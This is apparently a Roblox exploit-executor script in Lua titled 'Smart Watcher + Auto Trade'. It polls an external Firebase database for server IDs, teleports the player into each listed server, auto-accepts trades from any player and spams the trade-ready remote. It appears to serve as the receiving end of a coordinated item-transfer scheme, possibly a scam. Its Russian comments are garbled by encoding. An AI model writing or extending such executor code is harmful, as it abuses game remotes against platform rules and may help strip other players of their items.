local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

-- === FIREBASE ===
local FIREBASE_BASE = "https://api2-3dee6-default-rtdb.europe-west1.firebasedatabase.app"
local SERVERS_URL = FIREBASE_BASE .. "/servers.json"

-- === SETTINGS ===
local PLACE_ID = game.PlaceId
local MAX_AGE = 180 -- —Å–≤–µ–∂–µ—Å—Ç—å —Å–µ—Ä–≤–µ—Ä–æ–≤ (—Å–µ–∫)
local CHECK_DELAY = 3
local TRADE_CHECK_DELAY = 0.5

-- HTTP (–ø–æ–¥ –≤—Å–µ executors)
local httpRequest = request or http_request or (syn and syn.request)

-- visited —Å–µ—Ä–≤–µ—Ä–∞ (–∞–Ω—Ç–∏ –¥—É–±–ª—å)
local visited = {}

print("ü§ñ Smart Watcher + Auto Trade Started")

-- === REMOTE TRADE ===
local tradeRemote = ReplicatedStorage
    :WaitForChild("Shared")
    :WaitForChild("Remotes")
    :WaitForChild("Networking")
    :WaitForChild("RF/TradeRespondToOffer")

-- === –£–î–ê–õ–ï–ù–ò–ï –°–ï–†–í–ï–†–ê –ò–ó –ë–î ===
local function deleteServer(key)
    if not httpRequest then return end

    pcall(function()
        httpRequest({
            Url = FIREBASE_BASE .. "/servers/" .. key .. ".json",
            Method = "DELETE"
        })
    end)

    print("üóëÔ∏è Deleted server:", key)
end

-- === –ê–í–¢–û –ó–ê–•–û–î –í –°–ï–†–í–ï–† ===
local function joinServer(jobId, key)
    if not jobId then return end

    -- –µ—Å–ª–∏ —ç—Ç–æ —Ç–µ–∫—É—â–∏–π —Å–µ—Ä–≤–µ—Ä ‚Äî —É–¥–∞–ª—è–µ–º —á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ loop
    if jobId == game.JobId then
        deleteServer(key)
        return
    end

    visited[jobId] = true
    print("üöÄ Joining server:", jobId)

    local success = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            PLACE_ID,
            jobId,
            player
        )
    end)

    if success then
        deleteServer(key)
    end
end

-- === AUTO TRADE ACCEPT LOOP ===
task.spawn(function()
    while task.wait(TRADE_CHECK_DELAY) do
        local playerGui = player:FindFirstChild("PlayerGui")
        if not playerGui then continue end

        local tradeGui = playerGui:FindFirstChild("TradeRequest")
        if not tradeGui then continue end

        if tradeGui.Enabled == true then
            print("üí∞ Trade request detected!")

            -- –ø—Ä–æ–±—É–µ–º –ø—Ä–∏–Ω—è—Ç—å —Ç—Ä–µ–π–¥ –æ—Ç –ª—é–±–æ–≥–æ –∏–≥—Ä–æ–∫–∞
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= player then
                    local userId = tostring(plr.UserId)

                    pcall(function()
                        tradeRemote:InvokeServer(userId, true)
                    end)

                    task.wait(0.5)
                end
            end
        end
    end
end)

-- === AUTO READY TRADE LOOP ===
local readyRemote = ReplicatedStorage
    :WaitForChild("Shared")
    :WaitForChild("Remotes")
    :WaitForChild("Networking")
    :WaitForChild("RE/Trading/TradeReadyTrade")

local tradeActive = false

task.spawn(function()
    while task.wait(0.2) do
        local playerGui = player:FindFirstChild("PlayerGui")
        if not playerGui then continue end

        local menus = playerGui:FindFirstChild("Menus")
        if not menus then continue end

        local tradeMenu = menus:FindFirstChild("Trade")
        if not tradeMenu then continue end

        -- –µ—Å–ª–∏ —Ç—Ä–µ–π–¥ –æ—Ç–∫—Ä—ã–ª—Å—è
        if tradeMenu.Visible and not tradeActive then
            tradeActive = true
            print("üì¶ Trade menu detected, waiting 6 seconds...")

            task.wait(6)

            -- —Ü–∏–∫–ª –ø–µ—Ä–µ–±–æ—Ä–∞ –æ—Ç 0 –¥–æ 9
            task.spawn(function()
                while tradeMenu.Visible do
                    for i = 0, 9 do
                        if not tradeMenu.Visible then
                            tradeActive = false
                            break
                        end

                        local args = { true, i }
                        pcall(function()
                            readyRemote:FireServer(unpack(args))
                        end)

                        task.wait(0.2)
                    end
                end

                tradeActive = false
                print("‚ùå Trade menu closed, stopping ready loop")
            end)
        end
    end
end)




-- === SERVER WATCHER LOOP ===
while task.wait(CHECK_DELAY) do
    if not httpRequest then
        warn("HTTP not supported")
        break
    end

    local success, response = pcall(function()
        return game:HttpGet(SERVERS_URL)
    end)

    if not success or not response or response == "null" then
        continue
    end

    local data
    local ok = pcall(function()
        data = HttpService:JSONDecode(response)
    end)

    if not ok or not data then
        continue
    end

    for key, server in pairs(data) do
        local jobId = server.jobId
        local placeId = server.placeId
        local timestamp = server.time or 0

        if jobId
        and placeId == PLACE_ID
        and not visited[jobId]
        and (os.time() - timestamp <= MAX_AGE) then

            joinServer(jobId, key)
            task.wait(8)
            break
        else
            -- –∞–≤—Ç–æ —á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤ (>10 –º–∏–Ω—É—Ç)
            if timestamp and (os.time() - timestamp > 600) then
                deleteServer(key)
            end
        end
    end
end
